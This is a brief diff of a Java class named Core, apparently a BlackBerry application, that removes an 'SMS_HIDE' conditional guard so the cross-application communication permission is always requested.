@@ -141,9 +141,8 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_BROWSER_FILTER,
                 ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
                 ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
-                //#ifdef SMS_HIDE
                 ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
-                //#endif
+
 
                 //#ifdef OS_AT_LEAST_5
                 ApplicationPermissions.PERMISSION_INTERNET,
